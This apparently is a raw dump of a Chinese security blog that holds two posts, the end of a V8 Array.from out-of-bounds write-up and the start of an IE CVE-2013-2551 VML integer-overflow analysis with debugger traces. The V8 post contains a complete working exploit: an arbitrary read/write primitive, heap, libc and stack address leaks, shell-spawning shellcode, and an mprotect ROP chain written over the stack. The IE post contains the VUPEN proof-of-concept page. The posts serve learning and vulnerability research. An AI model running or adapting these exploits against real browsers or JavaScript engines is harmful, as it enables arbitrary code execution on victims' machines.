args.PopAndReturn(array.value());&#125;配合源码注释，可以基本了解函数流程。当然，这里还可以参考polyfill中的实现。在可以迭代的情况下，会使用ConstructArrayLike返回一个数组array，用于存储迭代输出的结果。配合前文分析的polyfill中的实现，这里返回的数组就是oobArray。这里也可以通过输出调试信息来进行验证然后会进入到BIND(&amp;loop)块，这应该就是在使用Symbol.iterator在进行迭代，每次迭代所得到的值都会存入array迭代结束后将进入&amp;loop_done，这里将index赋值给了length，也就是说length中存储的是迭代次数。最后调用了我们已经分析过的GenerateSetLength，三个参数分别是context，用于存储结果的array，迭代次数length漏洞原理总结结合前面GenerateSetLength的分析，我们就可以得出整个array.from的处理逻辑当在Array.from中迭代完成后调用了GenerateSetLength在GenerateSetLength中，若迭代次数小于array的长度，意味着array的长度大于了需求的长度，那么就需要对内存进行整理，释放多余的空间。这里我的想法是，迭代时是按顺序依次遍历每个元素，那么array的前length_smi个元素一定是被迭代访问过的且也是仅访问过的，后面多出的元素都不是迭代得到的，所以可以去掉。然而开发者似乎忽略了传入的数组可以是初始数组本身的情况，从而认为数组长度应该不会小于迭代次数（因为每次迭代都会创建一个新的数组元素）所以若数组是初始数组，那么我们就可以在迭代途中修改数组的长度。将正在迭代的数组长度缩小，那么就会导致数组多余的空间被释放，但是在GenerateSetLength中，又将array.length直接改写为较大的length_smi（迭代次数），导致长度属性值大于实际长度，造成越界访问。漏洞利用V8内存模型Tagged Value在v8中，存在两种类型，一个是Smi((small integer)，一个是指针类型。由于对齐，所以指针的最低位总是0，Tagged Value就是利用了最低位来区别Smi和指针类型。当最低位为1时，表示这是一个指针，当最低位为0，那么这就是一个Smi。Smi为了节约内存、加快运算速度等，实现了一个小整数类型，被称作Smi。在32位环境中，Smi占据32位，其中最低位为标记位（为0），所以Smi只使用了31位来表示值。在64位环境中，Smi占据64位，其中最低位为标记位（为0），但是只有高32位用于表示值，低32位都为0（包括标记位）指针最低位为1，在访问时需要将最低位置回0JsObject在V8中，JavaScript对象初始结构如下所示12345678[ hiddenClass / map ] -&gt; ... ; 指向Map[ properties ] -&gt; [empty array][ elements ] -&gt; [empty array][ reserved #1 ] -\[ reserved #2 ] |[ reserved #3 ] &#125;- in object properties,即预分配的内存空间............... |[ reserved #N ] -/Map中存储了一个对象的元信息，包括对象上属性的个数，对象的大小以及指向构造函数和原型的指针等等。同时，Map中保存了Js对象的属性信息，也就是各个属性在对象中存储的偏移。然后属性的值将根据不同的类型，放在properties、element以及预留空间中。properties指针，用于保存通过属性名作为索引的元素值，类似于字典类型elements指针，用于保存通过整数值作为索引的元素值，类似于常规数组reserved #n，为了提高访问速度，V8在对象中预分配了的一段内存区域，用来存放一些属性值（称为in-object属性），当向object中添加属性时，会先尝试将新属性放入这些预留的槽位。当in-onject槽位满后，V8才会尝试将新的属性放入properties中。当然，这里的介绍十分简略，详细细节可以参考文末给出的一些参考链接ArrayBuffer &amp;&amp; TypedArrayArrayBufferArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer 不能直接操作，而是要通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。TypedArray用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float64Array（64位浮点数）数组视图等等。简单的说，ArrayBuffer就代表一段原始的二进制数据，而TypedArray代表了一个确定的数据类型，当TypedArray与ArrayBuffer关联，就可以通过特定的数据类型格式来访问内存空间。这在我们的利用中十分重要，因为这意味着我们可以在一定程度上像C语言一样直接操作内存。内存结构在ArrayBuffer中存在一个BackingStore指针，这个指针指向的就是ArrayBuffer开辟的内存空间，可以使用TypedArray指定的类型读取和写入该区域，并且，这片内存区域是位于系统堆中的而不是属于GC管理的区域。常见利用有：可以如果修改ArrayBuffer中的Length，那么就能够造成越界访问。如果能够修改BackingStore指针，那么就可以获得任意读写的能力了，这是非常常用的一个手段可以通过BackingStore指针泄露堆地址，还可以在堆中布置shellcode。JsFunction在V8利用中，function也常常成为利用的一个目标。其内存结构如下：其中，CodeEntry是一个指向JIT代码的指针（RWX区域），如果具有任意写能力，那么可以向JIT代码处写入自己的shellcode，实现任意代码执行。但是，在v8 6.7版本之后，function的code不再可写，所以不能够直接修改jit代码了。本文漏洞将不采用修改jit代码的方法。（注：内存布局图是根据sakura师傅的博客重画的，但是我调试后发现，貌似函数代码指针应该在kLiteralsOffset的位置）自制类型转换小工具在v8利用中，不可避免的会读写内存。而读写内存就会使用到前文提到的ArrayBuffer &amp;&amp; TypedArray。在64位程序中，因为没有Uint64Array，所以要读写8字节的内存单元只能使用Float64Array（或者两个Uint32），但是float类型存储为小数编码，所以为了方便读写，我们需要自己实现一个Uint64与Float64之间转换的小工具123456789101112131415161718192021class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; //double ==&gt; Uint64 this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; //Uint64 ==&gt; double let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125;&#125;var mem = new Memory();任意读写能力根据前文对poc的分析，可以知道，我们能够构造出一个可以越界访问的数组（属性length值 &gt; 实际长度）。那么，如果可以在该数组后面内存中布置一些我们可控的对象，如ArrayBuffer，那么就可以通过修改BackingStore来实现任意读写了。这里，我们还想要能够泄露任意对象的地址，可以在oobArray后布置一个普通js对象，只要将目标对象作为该对象的属性值（in-object属性），然后通过越界读取，就可以泄露出目标对象的地址了。注意，利用过程需要使用release编译的文件。12345678910111213141516171819202122232425var bufs = [];var objs = [];var oobArray = [1.1];var maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray; &#125;, &#123;[Symbol.iterator] : _ =&gt; ( &#123; counter : 0, next() &#123; let result = 1.1; this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 1; for (let i = 0;i &lt; 100;i++) &#123; bufs.push(new ArrayBuffer(0x1234)); let obj = &#123;'a': 0x4321, 'b': 0x9999&#125;; objs.push(obj); &#125; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125; &#125;)&#125;);首先创建两个列表，bufs用于存储ArrayBuffer对象，objs用于存储普通Js对象在最后一次迭代中，先将oobArray的长度缩减为1（不能为0，否则对象将被回收），然后创建100个ArrayBuffer对象和普通js对象，我们希望创建的这些对象能够有一个落在oobArray所在内存后方，能够通过越界访问控制。然后我们就需要通过越界访问，对内存进行搜索，判断是否有我们创建的可控对象。其中ArrayBuffer是通过搜索其length值0x1234（在内存中Smi表示为0x123400000000）来定位普通js对象通过搜索其’a’属性的值0x4321（在内存中Smi表示为0x432100000000）来定位12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 可控的buf在oobArray的第i个元素处let buf_offset = 0;for(let i = 0; i &lt; maxSize; i++)&#123; let val = mem.d2u(oobArray[i]); if(val === 0x123400000000)&#123; console.log("buf_offset: " + i.toString()); buf_offset = i; oobArray[i] = mem.u2d(0x121200000000); //修改可控buf的length，做个标记 oobArray[i + 3] = mem.u2d(0x1212); //有两处保存了length值 break; &#125;&#125;// 可控的obj在oobArray的第i个元素处let obj_offset = 0for(let i = 0; i &lt; maxSize; i++)&#123; let val = mem.d2u(oobArray[i]); if(val === 0x432100000000)&#123; console.log("obj_offset: " + i.toString()); obj_offset = i; oobArray[i] = mem.u2d(0x567800000000); //修改可控obj的属性a，做个标记 break; &#125;&#125;// bufs中的第i个buf是可控的let controllable_buf_idx = 0;for(let i = 0; i &lt; bufs.length; i++)&#123; let val = bufs[i].byteLength; if(val === 0x1212)&#123; //查找被修改了length的buf console.log("found controllable buf at idx " + i.toString()); controllable_buf_idx = i; break; &#125;&#125;// objs中第i个obj是可控的let controllable_obj_idx = 0;for(let i = 0; i &lt; objs.length; i++)&#123; let val = objs[i].a; if(val === 0x5678)&#123; //查找属性a被修改了的obj console.log("found controllable obj at idx " + i.toString()); controllable_obj_idx = i; break; &#125;&#125;这样我们就成功获得了一个可控的ArrayBuffer和一个JS对象，然后就可以写一个小工具来方便我们的任意读写了。123456789101112131415161718192021222324252627class arbitraryRW&#123; constructor(buf_offset, buf_idx, obj_offset, obj_idx)&#123; this.buf_offset = buf_offset; this.buf_idx = buf_idx; this.obj_offset = obj_offset; this.obj_idx = obj_idx; &#125; leak_obj(obj)&#123; objs[this.obj_idx].a = obj; //修改obj.a的值为目标对象 return mem.d2u(oobArray[this.obj_offset]) - 1; //读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64 &#125; read(addr)&#123; let idx = this.buf_offset; oobArray[idx + 1] = mem.u2d(addr); //修改BackingStore指针指向目标地址 oobArray[idx + 2] = mem.u2d(addr); //修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同） let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); return mem.d2u(tmp[0]); &#125; write(addr, val)&#123; let idx = this.buf_offset; oobArray[idx + 1] = mem.u2d(addr); oobArray[idx + 2] = mem.u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); tmp.set([mem.u2d(val)]); //将欲存储的Uint64值转为double形式写入 &#125;&#125;var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);信息泄露在拥有了任意读写的能力后，其实已经可以通过改写函数jit代码来实现任意代码执行了。但是我在编译完v8后发现，该版本为6.7，恰好是已经不能够修改jit代码的版本了，所以还得使用其他办法（ROP）泄露堆地址我们知道，BackingStore指针指向的就是系统堆的地址，只需要通过越界读取ArrayBuffer就能泄露出来12var heap_addr = mem.d2u(oobArray[buf_offset + 1]) - 0x10console.log("heap_addr: 0x" + heap_addr.toString(16));泄露libc基址关于泄露libc的办法，我没有在网上搜到比较详细的方法（没有看懂Sakura师傅的方法）所以我采用了一个比较暴力的办法—————搜索堆内存。因为ctf pwn的经验，我知道在堆内存中一定存在某个堆块的fd或者bk指向libc中的地址。所以我尝试通过堆块的size和prevsize遍历堆中的chunk，搜索libc地址。这里我认为在fd或者bk位置上的数值，只要是0x7f开头的，一定是libc中的&amp;main_arena+88。同时，又因为libc基址是12位对齐的，所以将搜索到的地址减去固定偏移0x3c4000（根据libc版本而定），即可获得基址1234567891011121314151617181920212223242526272829let curr_chunk = heap_addr;let searched = 0;for(let i = 0; i &lt; 0x5000; i++)&#123; let size = arw.read(curr_chunk + 0x8); let prev_size = arw.read(curr_chunk); if(size !== 0 &amp;&amp; size % 2 === 0 &amp;&amp; prev_size &lt;= 0x3f0)&#123; let tmp_ptr = curr_chunk - prev_size; let fd = arw.read(tmp_ptr + 0x10); let bk = arw.read(tmp_ptr + 0x18) if(parseInt(fd / 0x10000000000) === 0x7f)&#123; searched = fd; break; &#125;else if(parseInt(bk / 0x10000000000) === 0x7f)&#123; searched = bk; break; &#125; &#125; else if(size &lt; 0x20) &#123; break; &#125; size = parseInt(size / 8) * 8 curr_chunk += size;&#125;if(searched !== 0)&#123; var libc_base = parseInt((searched - 0x3c4000) / 0x1000) * 0x1000; console.log("searched libc_base: 0x" + libc_base.toString(16));&#125; else &#123; console.log("Not found")&#125;这里我是以事先泄露的堆地址为起点进行搜索的，所以平均情况下，实际只搜索了一半的堆内存，有一定几率没有结果。泄露栈地址泄露栈地址的原因在后文会进行解释。在libc中存在一个全局变量叫做environ，是一个指向环境变量的指针，而环境变量恰好是存储在栈上高地址的，所以可以通过这个指针泄露出栈的地址。123let environ_addr = libc_base + 0x3C6F38;let stack_addr = arw.read(environ_addr);console.log("stack_addr: 0x" + stack_addr.toString(16));注意，在使用栈地址时要适当的减一些，不要修改到了高地址的环境变量，否则容易abort。布置shellcode在成功泄露出libc基址之后，如果按照ctf中getshell的思路，其实已经可以通过将malloc_hook修改为one_gadget实现getshell。但是，这里我们想要获得的是任意代码执行，所以还是得通过shellcode的方案。123456789let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];let shellcode = new Uint8Array(2048);for(let i = 0; i &lt; sc.length; i++)&#123; shellcode[i] = sc[i];&#125;let shell_addr = arw.read(arw.leak_obj(shellcode) + 0x68);console.log("shell_addr: 0x" + shell_addr.toString(16));这里我将shellcode全部写入了一个ArrayBuffer中，然后泄露出了shellcode的地址ROP布置完成shellcode之后，我们需要通过rop来修改shellcode所在内存执行权限。首先构造出我们的rop链123456789101112131415let pop_rdi = 0x0000000000021102 + libc_base;let pop_rsi = 0x00000000000202e8 + libc_base;let pop_rdx = 0x0000000000001b92 + libc_base;let mprotect = 0x0000000000101770 +libc_base;let rop = [ pop_rdi, parseInt(shell_addr / 0x1000) * 0x1000, //shellcode的地址，需要对齐 pop_rsi, 4096, pop_rdx, 7, mprotect, //调用mprotect修改内存权限 shell_addr //返回地址为shellcode];构造好rop链之后，就要考虑如何劫持程序流程到rop链上了。前文我们成功泄露出了栈地址，这里我们将采用一个技巧（和堆喷类似，我叫它栈喷2333）。因为我们获得的栈地址几乎可以说是栈最高的地址，所以我们可以在栈上地址由高到低连续布置retn，这样一旦程序的某个返回地址被我们的retn覆盖，那么程序就会不断的retn下去。只要我们在最高地址处布置上我们的rop链，那么程序在经过一段retn之后，就会来到我们的rop链上了。代码如下：123456789101112let retn = 0x000000000007EF0D + libc_base;let rop_start = stack_addr - 8 * (rop.length + 1); //先将栈提高，以免修改到了环境变量for (let i = 0; i &lt; rop.length; i++) &#123; arw.write(rop_start + 8 * i, rop[i]); //在高地址布置上我们的shellcode&#125;for (let i = 0; i &lt; 0x100; i++) &#123; //不断向低地址写retn rop_start -= 8; arw.write(rop_start, retn);&#125;print("done");这里写入了0x100个retn是实验出来的，值太大或太小都不能成功。完整利用EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209class Memory&#123; constructor()&#123; this.buf = new ArrayBuffer(8); this.f64 = new Float64Array(this.buf); this.u32 = new Uint32Array(this.buf); this.bytes = new Uint8Array(this.buf); &#125; d2u(val)&#123; this.f64[0] = val; let tmp = Array.from(this.u32); return tmp[1] * 0x100000000 + tmp[0]; &#125; u2d(val)&#123; let tmp = []; tmp[0] = parseInt(val % 0x100000000); tmp[1] = parseInt((val - tmp[0]) / 0x100000000); this.u32.set(tmp); return this.f64[0]; &#125;&#125;var mem = new Memory();var bufs = [];var objs = [];var oobArray = [1.1];var maxSize = 1028 * 8;Array.from.call(function() &#123; return oobArray; &#125;, &#123;[Symbol.iterator] : _ =&gt; ( &#123; counter : 0, next() &#123; let result = 1.1; this.counter++; if (this.counter &gt; maxSize) &#123; oobArray.length = 1; for (let i = 0;i &lt; 100;i++) &#123; bufs.push(new ArrayBuffer(0x1234)); let obj = &#123;'a': 0x4321, 'b': 0x9999&#125;; objs.push(obj); &#125; return &#123;done: true&#125;; &#125; else &#123; return &#123;value: result, done: false&#125;; &#125; &#125; &#125;)&#125;);function test() &#123;&#125; //没什么用，但是去掉后栈的位置会迷之提高（地址偏低），导致后面布置ROP失败for (let i = 0;i &lt; 1000;i++) &#123; test();&#125;// 可控的buf在oobArray的第i个元素处let buf_offset = 0;for(let i = 0; i &lt; maxSize; i++)&#123; let val = mem.d2u(oobArray[i]); if(val === 0x123400000000)&#123; console.log("buf_offset: " + i.toString()); buf_offset = i; oobArray[i] = mem.u2d(0x121200000000); //修改可控buf的size，做个标记 oobArray[i + 3] = mem.u2d(0x1212); break; &#125;&#125;// 可控的obj在oobArray的第i个元素处let obj_offset = 0for(let i = 0; i &lt; maxSize; i++)&#123; let val = mem.d2u(oobArray[i]); if(val === 0x432100000000)&#123; console.log("obj_offset: " + i.toString()); obj_offset = i; oobArray[i] = mem.u2d(0x567800000000); //修改可控obj的属性a，做个标记 break; &#125;&#125;// bufs中的第i个buf是可控的let controllable_buf_idx = 0;for(let i = 0; i &lt; bufs.length; i++)&#123; let val = bufs[i].byteLength; if(val === 0x1212)&#123; console.log("found controllable buf at idx " + i.toString()); controllable_buf_idx = i; break; &#125;&#125;// objs中第i个obj是可控的let controllable_obj_idx = 0;for(let i = 0; i &lt; objs.length; i++)&#123; let val = objs[i].a; if(val === 0x5678)&#123; console.log("found controllable obj at idx " + i.toString()); controllable_obj_idx = i; break; &#125;&#125;var heap_addr = mem.d2u(oobArray[buf_offset + 1]) - 0x10console.log("heap_addr: 0x" + heap_addr.toString(16));class arbitraryRW&#123; constructor(buf_offset, buf_idx, obj_offset, obj_idx)&#123; this.buf_offset = buf_offset; this.buf_idx = buf_idx; this.obj_offset = obj_offset; this.obj_idx = obj_idx; &#125; leak_obj(obj)&#123; objs[this.obj_idx].a = obj; return mem.d2u(oobArray[this.obj_offset]) - 1; &#125; read(addr)&#123; let idx = this.buf_offset; oobArray[idx + 1] = mem.u2d(addr); oobArray[idx + 2] = mem.u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); return mem.d2u(tmp[0]); &#125; write(addr, val)&#123; let idx = this.buf_offset; oobArray[idx + 1] = mem.u2d(addr); oobArray[idx + 2] = mem.u2d(addr); let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10); tmp.set([mem.u2d(val)]); &#125;&#125;var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);let curr_chunk = heap_addr;let searched = 0;for(let i = 0; i &lt; 0x5000; i++)&#123; let size = arw.read(curr_chunk + 0x8); let prev_size = arw.read(curr_chunk); if(size !== 0 &amp;&amp; size % 2 === 0 &amp;&amp; prev_size &lt;= 0x3f0)&#123; let tmp_ptr = curr_chunk - prev_size; let fd = arw.read(tmp_ptr + 0x10); let bk = arw.read(tmp_ptr + 0x18) if(parseInt(fd / 0x10000000000) === 0x7f)&#123; searched = fd; break; &#125;else if(parseInt(bk / 0x10000000000) === 0x7f)&#123; searched = bk; break; &#125; &#125; else if(size &lt; 0x20) &#123; break; &#125; size = parseInt(size / 8) * 8 curr_chunk += size;&#125;if(searched !== 0)&#123; var libc_base = parseInt((searched - 0x3c4000) / 0x1000) * 0x1000; console.log("searched libc_base: 0x" + libc_base.toString(16));&#125; else &#123; console.log("Not found")&#125;/*//修改malloc_hook实现getshellmalloc_hook = 0x3c4b10 + libc_base;one_gadet = 0x4526a + libc_base;arw.write(malloc_hook, [mem.u2d(one_gadet)]);*/let environ_addr = libc_base + 0x3C6F38;let stack_addr = arw.read(environ_addr);console.log("stack_addr: 0x" + stack_addr.toString(16));let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];let shellcode = new Uint8Array(2048);for(let i = 0; i &lt; sc.length; i++)&#123; shellcode[i] = sc[i];&#125;let shell_addr = arw.read(arw.leak_obj(shellcode) + 0x68);console.log("shell_addr: 0x" + shell_addr.toString(16));let retn = 0x000000000007EF0D + libc_base;let pop_rdi = 0x0000000000021102 + libc_base;let pop_rsi = 0x00000000000202e8 + libc_base;let pop_rdx = 0x0000000000001b92 + libc_base;let mprotect = 0x0000000000101770 +libc_base;let rop = [ pop_rdi, parseInt(shell_addr / 0x1000) * 0x1000, pop_rsi, 4096, pop_rdx, 7, mprotect, shell_addr];let rop_start = stack_addr - 8 * (rop.length + 1);for (let i = 0; i &lt; rop.length; i++) &#123; arw.write(rop_start + 8 * i, rop[i]);&#125;for (let i = 0; i &lt; 0x100; i++) &#123; rop_start -= 8; arw.write(rop_start, retn);&#125;print("done");总结虽然写完了exp，但是还是有一个玄学问题没有解决，在exp中必须要添加一个没什么用的函数并jit优化它，然后才能成功getshell。如果将它去掉，那么在最后”栈喷”的时候，程序的rsp距离我们泄露的栈地址贼远，没办法喷过去2333，调了很久也没弄清楚原因，希望有大佬知道的话能够告知一下。（萌新刚入门，文章如果有错误请师傅们谅解，如果发现我一定更正。参考资料v8基础sakura师傅的《v8 exploit》V8 Object 内存结构与属性访问详解[译] JavaScript 引擎基础：Shapes 和 Inline CachesA tour of V8: object representationFast properties in V8v8利用Google CTF justintime exploit扔个骰子学v8 - 从Plaid CTF roll a d8开始aSiagaming-PCTF 2018 Roll a d8]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>OOB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE整数溢出漏洞[cve-2013-2551]分析]]></title>
    <url>%2Fpost%2Fef2727d8.html</url>
    <content type="text"><![CDATA[调试的第二个洞，深刻的体会到了自己调试功底有多弱，在写这篇笔记的时候才理清调试思路。。。这个洞说是整数溢出，我感觉主要还是在整数溢出造成的越界访问上。调试环境windows7 32位(IE版本: 8.0.7600.16385)windbgImmunity Debugger这个洞在win8 + IE10下依然可以触发并利用POC调试poc代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;html&gt; &lt;head&gt; &lt;meta http-equiv="x-ua-compatible" content="IE=EmulateIE9" &gt; &lt;/head&gt; &lt;title&gt;POC by VUPEN&lt;/title&gt; &lt;style&gt;v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;&lt;/style&gt; &lt;xml:namespace ns="urn:schemas-microsoft-com:vml" prefix="v" /&gt; &lt;body onload="createRects(); exploit();"&gt; &lt;v:oval&gt; &lt;v:stroke id="vml1"/&gt; &lt;/v:oval&gt; &lt;/body&gt; &lt;script&gt; var rect_array = new Array() var a = new Array() function createRects()&#123; for(var i=0; i&lt;0x400; i++)&#123; rect_array[i] = document.createElement("v:shape") rect_array[i].id = "rect" + i.toString() document.body.appendChild(rect_array[i]) &#125; &#125; function exploit()&#123; var vml1 = document.getElementById("vml1") for (var i=0; i&lt;0x400; i++)&#123; a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle; //获取_vgRuntimeStyle属性 &#125; for (var i=0; i&lt;0x400; i++)&#123; a[i].rotation; //第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft if (i == 0x300) &#123; //在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间 vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44" &#125; &#125; vml1.dashstyle.array.length = 0 - 1; //整数溢出 for (var i=0; i&lt;0x400; i++) &#123; a[i].marginLeft = "hpasserby"; //设置marginLeft的值，用于判断该对象是否紧接在dashstyle（ORG数组）之后。 marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16); if (marginLeftAddress &gt; 0) &#123; vml1.dashstyle.array.item(0x2E+0x16) = 0x41414141; &#125; &#125; &#125;&lt;/script&gt;&lt;/html&gt;触发漏洞首先开启HPA选项，在上一篇博客中提到过gflag.exe -i iexplore.exe +hpa使用windbg进行调试，程序中断在以下位置1234567891011121314151617181920210:005&gt; g(d14.e8c): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=1a53f064 ebx=6acc4964 ecx=00000001 edx=00000000 esi=1a53f060 edi=0463be4ceip=766c9966 esp=0463be08 ebp=0463be10 iopl=0 nv up ei ng nz ac pe cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010297msvcrt!memcpy+0x158:766c9966 8b448efc mov eax,dword ptr [esi+ecx*4-4] ds:0023:1a53f060=????????0:005&gt; kbChildEBP RetAddr Args to Child 0463be10 6ac6cfa9 0463be4c 1a53f060 00000004 msvcrt!memcpy+0x1580463be24 6acbda0f 1b1d2fe8 0463be4c 00000044 vgx!ORG::Get+0x270463be50 764a3ec3 1b1d2fe8 00000044 0463beb4 vgx!COALineDashStyleArray::get_item+0x8c0463be70 764a3d3d 1b3daff0 00000024 00000004 OLEAUT32!DispCallFunc+0x1650463bf00 6aca47c1 08829454 1b3daff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f0463c08c 6acc4a88 1b3daff4 1b3daff0 6ace223c vgx!COADispatch::Invoke+0x890463c0c0 68c3db38 1b3daff0 00000000 68c30adc vgx!COADispatchImpl&lt;IVgDashStyleArray,&amp;IID_IVgDashStyleArray,COAShapeProg&gt;::Invoke+0x2f0463c100 68c3da8c 092ecd10 00000000 00000409 jscript!IDispatchInvoke2+0xf00463c13c 68c3d9ff 092ecd10 00000409 00000003 jscript!IDispatchInvoke+0x6a0463c1fc 68c3db8a 092ecd10 00000000 00000003 jscript!InvokeDispatch+0xa9可以看到，crash的原因是访问了非法内存，查看该内存附近区域1234567891011121314151617181920210:005&gt; dd 1a53f060-100 l501a53ef60 00000005 00000006 00000007 000000081a53ef70 00000009 0000000a 0000000b 0000000c1a53ef80 0000000d 0000000e 0000000f 000000101a53ef90 00000011 00000012 00000013 000000141a53efa0 00000015 00000016 00000017 000000181a53efb0 00000019 0000001a 0000001b 0000001c1a53efc0 0000001d 0000001e 0000001f 000000201a53efd0 00000021 00000022 00000023 000000241a53efe0 00000025 00000026 00000027 000000281a53eff0 00000029 0000002a 0000002b 0000002c1a53f000 ???????? ???????? ???????? ????????1a53f010 ???????? ???????? ???????? ????????1a53f020 ???????? ???????? ???????? ????????1a53f030 ???????? ???????? ???????? ????????1a53f040 ???????? ???????? ???????? ????????1a53f050 ???????? ???????? ???????? ????????1a53f060 ???????? ???????? ???????? ????????1a53f070 ???????? ???????? ???????? ????????1a53f080 ???????? ???????? ???????? ????????1a53f090 ???????? ???????? ???????? ????????可以注意到在所访问的非法内存前面，存在一串极其规律的数字，结合POC中的代码，我们发现这应该是dashstyle属性的值，这是一个数组，其中每个元素大小为4字节。1vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"继续结合POC，发现下面这句对dashstyle数组的访问应该就是造成crash的原因了1marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);其中0x2E+0x16正好是访问的非法内存地址相对于数组的偏移。这意味着，我们拥有了数组越界访问的能力。但是，漏洞的成因我们还是不得而知，观察函数调用栈，向上回溯到vgx!ORG::Get，在函数开始处下上断点。12345678910111213141516170:015&gt; bp vgx!ORG::Get0:005&gt; gBreakpoint 7 hiteax=1b570fe8 ebx=70a84964 ecx=70a17258 edx=0449bfb4 esi=1b778ff0 edi=0449c55ceip=70a2cf82 esp=0449bf90 ebp=0449bfb8 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246vgx!ORG::Get:70a2cf82 8bff mov edi,edi0:005&gt; dd esp l40449bf90 70a7da0f 1b570fe8 0449bfb4 000000440:005&gt; dd 1b570fe8 l8 1b570fe8 70a17258 002cffff 00040004 000001011b570ff8 1a7dcf50 d0d0d0d0 ???????? ????????0:005&gt; ln 70a17258 //查看对象虚表(70a17258) vgx!ORG::`vftable&apos; | (70a172e8) vgx!vrgopNinchExact matches: vgx!ORG::`vftable&apos; = &lt;no type information配合IDA查看该函数结构12345678void *__stdcall ORG::Get(int a1, void *Dst, int a3)&#123; void *result; // eax if ( Dst ) result = memcpy(Dst, (*(a1 + 16) + a3 * (*(a1 + 8) &amp; 0xFFFF)), *(a1 + 8) &amp; 0xFFFF); return result;&#125;根据第一个参数的虚表指针可以知道到，a1是一个vgx!ORG对象，*(a1+16)是dashstyle数组的起始地址。从而可以得知，dashstyle属性是靠vgx!ORG对象进行管理的。第三个参数a3则是所访问的元素的偏移，正好是0x2e+0x16=0x44然而，按照程序执行正常流程来说，是不应该调用到这个函数的，越界访问应该提前被检查到，所以我们还需要继续向前回溯，在vgx!COALineDashStyleArray::get_item处下断点，同时配合IDA。123456789101112131415161718192021int __stdcall COALineDashStyleArray::get_item(struct COAProg **this, signed int a2, int *a3)&#123; struct COAProg **v3; // esi int v4; // esi struct COAProg *v6; // eax int v7; // eax signed int v8; // eax int v9; // [esp+4h] [ebp-14h] int v10; // [esp+14h] [ebp-4h] ... if ( a2 &lt;= -1 || (v8 = (*(*this + 11))(this), a2 &gt;= v8) ) &#123; v9 = 0x80048230; &#125; else &#123; v10 = 0; (*(*this + 7))(this, &amp;v10, a2); //vgx!ORG::Get *a3 = v10; &#125; ...12345678910110:005&gt; g0:015&gt; bp vgx!COALineDashStyleArray::get_item0:005&gt; gBreakpoint 7 hiteax=0000000a ebx=70a84964 ecx=70a7d983 edx=184eaff2 esi=018baea0 edi=0473c2f4eip=70a7d983 esp=0473bd54 ebp=0473bd70 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202vgx!COALineDashStyleArray::get_item:70a7d983 8bff mov edi,edi0:005&gt; dd esp l40473bd54 764a3ec3 1b398ff0 00000044 0473bdb4通过调试，确定ida代码中调用的两个函数指针分别为12v8 = (*(*this + 11))(this) //vgx!ORG::CElements()(*(*this + 7))(this, &amp;v10, a2); //vgx!ORG::Get(int a1, void *Dst, int 